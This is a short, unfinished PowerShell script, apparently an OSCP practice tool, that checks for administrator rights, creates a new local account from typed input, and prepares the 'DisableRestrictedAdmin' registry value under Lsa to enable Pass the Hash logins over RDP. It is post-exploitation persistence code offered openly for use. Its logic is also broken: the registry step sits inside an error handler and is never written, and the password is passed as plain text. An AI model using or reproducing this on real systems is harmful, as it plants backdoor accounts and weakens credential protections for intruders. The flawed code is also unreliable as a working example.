# The contents of this PowerShell script are not be used for illegal activities.
# This is all for test purposes to find vulnerabilities, and to exploit vulnerabilities.
# The development of this PowerShell is due to an idea I had for my OSCP.

# December 30th, 2024
# What has been done:
# - Created a template of how the script should work.
# - Created comments and section each part out.
# - Limited test to confirm new user is created with inputs from user (you)

# To do:
# - Fix up line 37 to include the full registry key to add for full Pass the Hash RDP technique.
# - Test script to find errors that could occur.

# Test if are in the "Adminstrators" rights
$adminGroup = [System.Security.Principal.WindowsBuiltInRole]::Administrators
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$isAdmin = $currentUser.Groups -match $adminGroup

#If you have "Administrator" rights, proceed with creation of new Admin user.
if ($isAdmin) {
    Write-Host "You are an administrator."

      # Info on new local user
      $username = Read-Host "Enter username"
      $password = Read-Host "Enter password"

        # Creating the new user
        try {
          $user = New-LocalUser -Name $username -password $password
          Write-Host "User $username has been created"
        } catch {
            Write-Host "Failed to create the user. Error: $_"

        # Specifying registry key to allow "Pass the Hash" RDP techniques.
          $KeyPath = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"
          $KeyName = "DisableRestrictedAdmin"
          $Type = "REG_DWORD"
          $Value = "0"

        # Creating the registry key to allow "Pass the Hash" RDP techniques
          if (-not (Test-Path $KeyPath)) {
          New-Item -Path $KeyPath -Force
          Write-Host "Registry key '$KeyPath' created."
    }
        }    
} else {
    Write-Host "You are NOT an administrator."
}

